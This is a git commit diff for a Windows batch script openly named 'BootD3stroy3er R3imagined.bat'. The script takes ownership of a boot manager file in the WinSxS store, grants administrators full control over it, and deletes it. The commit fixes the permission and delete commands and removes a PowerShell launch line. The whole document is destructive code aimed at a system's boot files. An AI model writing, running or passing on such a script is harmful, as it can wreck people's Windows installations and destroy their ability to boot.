e4919328e833c80eaddf79239cf27790195f0571
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-11-23 21:13:34 -0700

    Update BootD3stroy3er R3imagined.bat

--- BootD3stroy3er R3imagined.bat
+++ BootD3stroy3er R3imagined.bat
@@ -1,8 +1,7 @@
 @echo off
 takeown /f "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
-icacls "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
-del /r /s /q "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
- start powershell
+icacls "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr" /grant administrators:F /t
+del "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
 
 
 
